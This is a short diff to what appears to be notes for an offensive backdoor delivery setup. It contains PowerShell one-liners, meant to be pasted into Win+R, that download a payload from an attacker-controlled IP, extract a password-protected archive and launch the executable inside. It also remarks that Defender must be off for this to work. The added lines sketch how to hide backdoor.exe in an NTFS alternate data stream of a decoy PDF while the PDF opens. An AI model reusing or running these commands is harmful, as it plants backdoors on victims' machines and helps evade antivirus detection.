@@ -105,3 +105,10 @@ Win + R and then :
 powershell -Command "Invoke-WebRequest -Uri 'http://<IP>/Windows.zip' -OutFile '$env:TEMP\Windows.zip'; & 'C:\Program Files\7-Zip\7z.exe' x '$env:TEMP\Windows.zip' -o'$env:TEMP' -p12345 -y; Start-Process '$env:TEMP\file.exe'"
 ```
 Note : The backdoor will likely be flagged unless Defender is disabled 
+
+
+
+----
+In Progress, Try to download and inject backdoor.exe in ADS of opening sample.pdf 
+something like this in Win+R :
+powershell.exe -ExecutionPolicy Bypass -Command "$ip='YOUR.IP.HERE'; Invoke-WebRequest -Uri \"http://$ip/backdoor.txt\" -OutFile backdoor.txt; Invoke-WebRequest -Uri \"http://$ip/Sample.pdf\" -OutFile Sample.pdf; Start-Process Sample.pdf; Rename-Item backdoor.txt backdoor.exe; Set-Content -Path 'Sample.pdf:backdoor.exe' -Value ([System.IO.File]::ReadAllBytes('backdoor.exe')) -Encoding Byte"
